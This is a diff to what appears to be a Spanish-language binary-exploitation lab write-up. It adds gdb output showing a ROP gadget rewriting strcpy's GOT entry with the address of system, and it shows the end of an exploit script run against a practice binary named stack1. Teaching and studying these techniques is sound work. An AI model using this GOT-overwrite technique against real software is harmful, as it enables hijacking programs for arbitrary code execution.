@@ -502,7 +502,18 @@ payload = junk + rop
 print payload
 ```
 
-Comprobamos que funciona:
+Si debugeamos el programa anterior, vemos que antes de ejecutar la instrucción "add [ebx+0x5d5b04c4] eax" tenemos aún el valor del GOT de strcpy en memoria:
+```
+gdb-peda$ x/32xw 0x08049710
+0x8049710 <strcpy@got.plt>:	0xb7e7f2f0	0x0804837e	0x0804838e	0xb7e57870
+```
+Una vez ejecutada la instrucción, vemos como ha cambiado al valor de system, ¡magia borragia!
+```
+gdb-peda$ x/32xw 0x08049710
+0x8049710 <strcpy@got.plt>:	0xb7e32b30	0x0804837e	0x0804838e	0xb7e57870
+```
+
+Comprobamos que funciona si terminamos de ejecutarlo:
 
 ```
 /stack1 $(python gotover.py )you have correctly got the variable to the right value
